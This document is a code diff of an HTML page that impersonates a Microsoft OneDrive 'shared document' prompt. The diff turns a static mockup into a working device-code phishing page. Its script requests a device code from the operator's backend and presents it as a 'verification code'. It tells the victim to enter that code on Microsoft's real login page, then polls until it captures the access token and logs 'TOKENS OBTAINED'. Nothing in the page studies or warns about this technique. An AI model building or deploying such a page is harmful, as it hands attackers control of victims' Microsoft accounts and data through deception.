@@ -1,16 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>OneDrive · Shared Document</title>
   <style>
-    /* === Microsoft Fluent Design System — Unified Blue === */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
       background: #f2f4f8;
@@ -34,33 +29,29 @@
       transition: box-shadow 0.2s ease;
     }
 
-    .fluent-card:hover {
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
-    }
+    .fluent-card:hover { box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08); }
 
-    /* === HEADER === */
     .fluent-header {
       display: flex;
       align-items: center;
-      gap: 10px;
+      gap: 4px;                      /* ← reduced from 10px to 4px */
       margin-bottom: 28px;
     }
 
     .fluent-header svg {
-      width: 34px;
-      height: 34px;
+      width: 44px;
+      height: 44px;
       flex-shrink: 0;
       fill: #0078D4;
     }
 
     .fluent-header span {
-      font-size: 20px;
+      font-size: 22px;
       font-weight: 600;
       color: #1a1a1a;
       letter-spacing: -0.2px;
     }
 
-    /* === CIRCLED PADLOCK (unified blue) === */
     .lock-badge {
       display: flex;
       justify-content: center;
@@ -74,15 +65,9 @@
 
     .lock-badge circle,
     .lock-badge rect,
-    .lock-badge path {
-      stroke: #0078D4;
-    }
+    .lock-badge path { stroke: #0078D4; }
 
-    .heading-wrapper {
-      text-align: center;
-      margin-bottom: 6px;
-    }
-
+    .heading-wrapper { text-align: center; margin-bottom: 6px; }
     .fluent-heading {
       font-size: 20px;
       font-weight: 600;
@@ -98,7 +83,6 @@
       text-align: center;
     }
 
-    /* === DARK CODE BLOCK — CENTERED === */
     .code-area {
       background: #1e1e2f;
       border-radius: 8px;
@@ -134,7 +118,11 @@
       display: block;
       text-align: center;
       margin: 2px 0 4px 0;
+      min-height: 48px;
     }
+
+    .code-value.loading { color: #6a8aaa; font-size: 18px; letter-spacing: 1px; }
+    .code-value.error { color: #ef4444; }
 
     .copy-btn {
       background: #2a2a4a;
@@ -152,26 +140,16 @@
       white-space: nowrap;
     }
 
-    .copy-btn:hover {
-      background: #3a3a5e;
-      border-color: #4FC3F7;
-      color: #ffffff;
-    }
-
-    .copy-btn:hover svg {
-      stroke: #4FC3F7;
-    }
-
-    .copy-btn:active {
-      transform: scale(0.96);
-    }
+    .copy-btn:hover { background: #3a3a5e; border-color: #4FC3F7; color: #ffffff; }
+    .copy-btn:active { transform: scale(0.96); }
 
     .copy-btn svg {
       stroke: #c8d0e0;
       transition: stroke 0.15s ease;
     }
 
-    /* === STEPS — UNIFIED BLUE CIRCLES === */
+    .copy-btn:hover svg { stroke: #4FC3F7; }
+
     .steps-list {
       list-style: none;
       padding: 0;
@@ -192,9 +170,7 @@
       border-bottom: 1px solid #f0f3f7;
     }
 
-    .steps-list li:last-child {
-      border-bottom: none;
-    }
+    .steps-list li:last-child { border-bottom: none; }
 
     .step-circle {
       display: inline-flex;
@@ -220,18 +196,17 @@
       border: 1px solid #d0d6de;
     }
 
-    /* === CONTINUE BUTTON — UNIFIED BLUE === */
     .continue-btn {
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 12px;
+      gap: 10px;
       width: 100%;
       background: #0078D4;
       color: #ffffff;
       border: none;
       border-radius: 6px;
-      padding: 13px 0;
+      padding: 14px 0;
       font-size: 16px;
       font-weight: 500;
       cursor: pointer;
@@ -243,21 +218,30 @@
     }
 
     .continue-btn svg {
-      width: 20px;
-      height: 20px;
       flex-shrink: 0;
+      display: inline-block;
     }
 
-    .continue-btn:hover {
-      background: #0067B8;
-      box-shadow: 0 2px 12px rgba(0, 120, 212, 0.25);
+    .continue-btn:hover { background: #0067B8; box-shadow: 0 2px 12px rgba(0, 120, 212, 0.25); }
+    .continue-btn:active { transform: scale(0.98); }
+    .continue-btn:disabled { opacity: 0.5; pointer-events: none; }
+
+    .status-area {
+      margin: -12px 0 20px 0;
+      padding: 8px 12px;
+      border-radius: 6px;
+      font-size: 14px;
+      text-align: center;
+      min-height: 40px;
+      background: #f8faff;
+      border: 1px solid #eaeef2;
+      color: #1a1a1a;
     }
 
-    .continue-btn:active {
-      transform: scale(0.98);
-    }
+    .status-area.pending { background: #fff8e6; border-color: #f5d742; color: #5a4d00; }
+    .status-area.approved { background: #e6f7e6; border-color: #1ea81e; color: #005a00; }
+    .status-area.error { background: #ffebee; border-color: #e74c3c; color: #7a0000; }
 
-    /* === FOOTER — CENTERED === */
     .fluent-footer {
       display: flex;
       flex-direction: column;
@@ -290,49 +274,31 @@
     }
 
     @media (max-width: 500px) {
-      .fluent-card {
-        padding: 24px 18px;
-      }
-      .code-value {
-        font-size: 26px;
-        letter-spacing: 2px;
-      }
-      .lock-badge svg {
-        width: 32px;
-        height: 32px;
-      }
-      .fluent-heading {
-        font-size: 18px;
-      }
-      .continue-btn {
-        font-size: 14px;
-        gap: 8px;
-      }
-      .continue-btn svg {
-        width: 18px;
-        height: 18px;
-      }
-      .step-circle {
-        width: 22px;
-        height: 22px;
-        font-size: 12px;
-      }
+      .fluent-card { padding: 24px 18px; }
+      .code-value { font-size: 26px; letter-spacing: 2px; }
+      .lock-badge svg { width: 32px; height: 32px; }
+      .fluent-heading { font-size: 18px; }
+      .continue-btn { font-size: 14px; gap: 8px; padding: 12px 0; }
+      .continue-btn svg { width: 20px; height: 20px; }
+      .step-circle { width: 22px; height: 22px; font-size: 12px; }
+      .fluent-header svg { width: 36px; height: 36px; }
+      .fluent-header span { font-size: 20px; }
+      .fluent-header { gap: 2px; } /* even tighter on mobile */
     }
   </style>
 </head>
 <body>
 
 <div class="fluent-card">
-
-  <!-- OneDrive with cloud logo -->
+  <!-- OneDrive header – REAL LOGO, LARGER, TIGHTLY PACKED -->
   <div class="fluent-header">
-    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-      <path d="M10.5 3.5c-2.5 0-4.5 2-4.5 4.5 0 1.2.5 2.3 1.2 3.1C5.8 12.3 4.5 14.1 4.5 16c0 2.5 2 4.5 4.5 4.5h10c2.5 0 4.5-2 4.5-4.5 0-2.1-1.4-3.9-3.3-4.5.1-.5.2-1 .2-1.5 0-2.5-2-4.5-4.5-4.5-.7 0-1.4.2-2 .5-.4-.7-1.1-1.2-1.9-1.5z" />
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#0078D4">
+      <path d="M16.5 6.5C15.9 5.3 14.7 4.5 13.3 4.5C12.1 4.5 11 5.1 10.3 6C9.7 5.6 8.9 5.2 8 5.2C5.9 5.2 4.2 6.9 4.2 9C4.2 9.2 4.2 9.4 4.3 9.6C3.3 9.8 2.5 10.7 2.5 12C2.5 13.5 3.7 14.8 5.3 14.8H16.5C18 14.8 19.3 13.6 19.3 12C19.3 10.6 18.3 9.4 16.9 9.2C17 9 17 8.8 17 8.6C17 7.1 15.8 5.8 14.2 5.8C14.1 5.8 14 5.8 13.9 5.9C13.7 6.2 13.4 6.4 13 6.5C13.2 6.5 13.4 6.6 13.6 6.8C14.2 7.1 14.6 7.7 14.8 8.4C15 9.1 15 9.8 14.8 10.5H16.5C17.3 10.5 18 11.2 18 12C18 12.8 17.3 13.5 16.5 13.5H5.3C4.5 13.5 3.8 12.8 3.8 12C3.8 11.2 4.5 10.5 5.3 10.5H7C6.8 9.8 6.8 9.1 7 8.4C7.2 7.7 7.6 7.1 8.2 6.8C8.4 6.6 8.6 6.5 8.8 6.5C8.4 6.4 8.1 6.2 7.9 5.9C7.8 5.8 7.7 5.8 7.6 5.8C6 5.8 4.8 7.1 4.8 8.6C4.8 8.8 4.8 9 4.9 9.2C3.5 9.4 2.5 10.6 2.5 12C2.5 13.6 3.8 14.8 5.3 14.8H16.5C18 14.8 19.3 13.6 19.3 12C19.3 10.6 18.3 9.4 16.9 9.2Z" />
     </svg>
     <span>OneDrive</span>
   </div>
 
-  <!-- Circled padlock (unified blue) -->
+  <!-- Lock badge -->
   <div class="lock-badge">
     <svg viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
       <circle cx="12" cy="12" r="10" stroke-width="1.5" fill="none" />
@@ -345,17 +311,15 @@
   <div class="heading-wrapper">
     <div class="fluent-heading">View shared document</div>
   </div>
-
-  <!-- Subtitle -->
   <div class="fluent-sub">
-    Someone shared a document with you on OneDrive.<br>
+    Someone shared a document with you on OneDrive.<br />
     Verify your identity with Microsoft to access it.
   </div>
 
-  <!-- Centered code block -->
+  <!-- Code block -->
   <div class="code-area">
     <div class="code-label">YOUR VERIFICATION CODE</div>
-    <span class="code-value" id="verificationCode">BRM38F626</span>
+    <span class="code-value loading" id="verificationCode">⟳ Generating…</span>
     <button class="copy-btn" id="copyBtn">
       <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
         <rect x="5" y="5" width="8" height="8" rx="1" />
@@ -365,16 +329,19 @@
     </button>
   </div>
 
-  <!-- Steps — unified blue circles -->
+  <!-- Dynamic status -->
+  <div class="status-area" id="statusMessage">⏳ Starting device flow…</div>
+
+  <!-- Steps -->
   <ul class="steps-list">
     <li><span class="step-circle">1</span> Copy the code above</li>
     <li><span class="step-circle">2</span> Click continue and paste <span class="key-hint">Ctrl+V</span></li>
     <li><span class="step-circle">3</span> Sign in with your Microsoft account</li>
   </ul>
 
-  <!-- Continue button — unified blue -->
+  <!-- Continue button – "Continue to Microsoft" with logo -->
   <button class="continue-btn" id="continueBtn">
-    <svg viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+    <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="flex-shrink:0;">
       <rect x="2" y="2" width="9" height="9" fill="#F25022" />
       <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
       <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
@@ -383,7 +350,7 @@
     Continue to Microsoft
   </button>
 
-  <!-- Centered footer -->
+  <!-- Footer -->
   <div class="fluent-footer">
     <span class="footer-secured">
       <svg viewBox="0 0 24 24" fill="none" stroke="#107C10" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -394,23 +361,50 @@
     </span>
     <span class="footer-copy">© 2026 Microsoft Corporation. All rights reserved.</span>
   </div>
-
 </div>
 
 <script>
   (function() {
+    'use strict';
+
     const codeSpan = document.getElementById('verificationCode');
     const copyBtn = document.getElementById('copyBtn');
     const continueBtn = document.getElementById('continueBtn');
+    const statusMsg = document.getElementById('statusMessage');
+
+    let deviceCode = '';
+    let userCode = '';
+    let verificationUri = '';
+    let pollInterval = null;
+    let isPolling = false;
+    let isApproved = false;
+    const API_BASE = window.location.origin;
+
+    function setStatus(text, type = '') {
+      statusMsg.textContent = text;
+      statusMsg.className = 'status-area' + (type ? ' ' + type : '');
+    }
+
+    function setCode(text, state = '') {
+      codeSpan.textContent = text;
+      codeSpan.className = 'code-value' + (state ? ' ' + state : '');
+    }
+
+    function addLog(msg) {
+      console.log('[OneDrive]', msg);
+    }
 
     copyBtn.addEventListener('click', function(e) {
       e.preventDefault();
       const code = codeSpan.textContent.trim();
+      if (!code || code.startsWith('⟳') || code.startsWith('⚠')) {
+        alert('No valid code to copy. Please wait for generation.');
+        return;
+      }
       if (navigator.clipboard && navigator.clipboard.writeText) {
         navigator.clipboard.writeText(code).then(() => {
-          const orig = copyBtn.innerHTML;
           copyBtn.innerHTML = '✓ Copied!';
-          setTimeout(() => { copyBtn.innerHTML = orig; }, 1800);
+          setTimeout(() => { copyBtn.innerHTML = '📋 Copy Code'; }, 1800);
         }).catch(() => fallbackCopy(code));
       } else {
         fallbackCopy(code);
@@ -427,21 +421,163 @@
       ta.select();
       try {
         document.execCommand('copy');
-        const orig = copyBtn.innerHTML;
         copyBtn.innerHTML = '✓ Copied!';
-        setTimeout(() => { copyBtn.innerHTML = orig; }, 1800);
+        setTimeout(() => { copyBtn.innerHTML = '📋 Copy Code'; }, 1800);
       } catch (err) {
         alert('Unable to copy. Please select the code manually.');
       }
       document.body.removeChild(ta);
     }
 
-    continueBtn.addEventListener('click', function(e) {
-      e.preventDefault();
-      alert('🔐 Fluent UI — document tile removed.\nIn production, this would initiate Microsoft OAuth flow.');
+    async function pollForToken(manual = false) {
+      if (!deviceCode || isPolling || isApproved) return;
+      isPolling = true;
+
+      try {
+        const resp = await fetch(`${API_BASE}/device/token`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ device_code: deviceCode })
+        });
+
+        const data = await resp.json();
+        addLog('Poll response: ' + JSON.stringify(data));
+
+        if (data.access_token) {
+          isApproved = true;
+          clearInterval(pollInterval);
+          pollInterval = null;
+          setStatus('✅ Approved! You now have access.', 'approved');
+          setCode('✅ Approved', '');
+          continueBtn.disabled = false;
+          continueBtn.innerHTML = `
+            <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="flex-shrink:0;">
+              <rect x="2" y="2" width="9" height="9" fill="#F25022" />
+              <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
+              <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
+              <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
+            </svg>
+            Access Granted
+          `;
+          continueBtn.onclick = () => {
+            alert('🎉 Access token obtained! In production, you would be redirected.');
+          };
+          addLog('✅ TOKENS OBTAINED');
+          isPolling = false;
+          return;
+        }
+
+        if (data.error === 'authorization_pending') {
+          setStatus('⏳ Waiting for your approval on the Microsoft page…', 'pending');
+          isPolling = false;
+          return;
+        }
+
+        if (data.error === 'expired_token') {
+          clearInterval(pollInterval);
+          pollInterval = null;
+          setStatus('⏰ Code expired. Please refresh the page.', 'error');
+          setCode('⏰ EXPIRED', 'error');
+          continueBtn.disabled = true;
+          isPolling = false;
+          return;
+        }
+
+        if (data.error) {
+          setStatus(`⚠️ ${data.error} — will retry`, 'error');
+          isPolling = false;
+          return;
+        }
+
+        setStatus('⏳ Still waiting…', 'pending');
+        isPolling = false;
+
+      } catch (err) {
+        console.error('Poll error:', err);
+        setStatus(`❌ Poll error: ${err.message}`, 'error');
+        isPolling = false;
+      }
+    }
+
+    async function startDeviceFlow() {
+      setStatus('⏳ Requesting code from Microsoft…', 'pending');
+      setCode('⟳ Loading…', 'loading');
+      continueBtn.disabled = true;
+      continueBtn.innerHTML = `
+        <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="flex-shrink:0;">
+          <rect x="2" y="2" width="9" height="9" fill="#F25022" />
+          <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
+          <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
+          <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
+        </svg>
+        Continue to Microsoft
+      `;
+
+      try {
+        const resp = await fetch(`${API_BASE}/device/request`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' }
+        });
+
+        if (!resp.ok) {
+          const errText = await resp.text();
+          throw new Error(`HTTP ${resp.status}: ${errText}`);
+        }
+
+        const data = await resp.json();
+        addLog('Device code response: ' + JSON.stringify(data));
+
+        if (data.error) throw new Error(data.error_description || data.error);
+
+        deviceCode = data.device_code;
+        userCode = data.user_code;
+        verificationUri = data.verification_uri || 'https://microsoft.com/devicelogin';
+
+        setCode(userCode, '');
+        setStatus(`⏳ Code: ${userCode} — open Microsoft page and enter it.`, 'pending');
+
+        continueBtn.disabled = false;
+        continueBtn.onclick = function(e) {
+          e.preventDefault();
+          if (verificationUri) {
+            window.open(verificationUri, '_blank');
+            setStatus('📌 Opened Microsoft login page. Enter the code there.', 'pending');
+          } else {
+            alert('No verification URI available.');
+          }
+        };
+
+        if (pollInterval) clearInterval(pollInterval);
+        const intervalMs = (data.interval || 5) * 1000 + 500;
+        pollInterval = setInterval(() => pollForToken(), intervalMs);
+        setTimeout(() => pollForToken(), 1000);
+
+        addLog(`✅ Code ${userCode} generated. URI: ${verificationUri}`);
+
+      } catch (err) {
+        console.error('Device flow error:', err);
+        setStatus(`❌ Error: ${err.message}`, 'error');
+        setCode('⚠️ Error', 'error');
+        continueBtn.disabled = true;
+        addLog('❌ ' + err.message);
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(startDeviceFlow, 400);
     });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'r' && !e.ctrlKey && !e.metaKey && !e.altKey) {
+        e.preventDefault();
+        if (pollInterval) clearInterval(pollInterval);
+        isApproved = false;
+        startDeviceFlow();
+      }
+    });
+
+    console.log('🍟 OneDrive · Production device login ready.');
   })();
 </script>
-
 </body>
 </html>
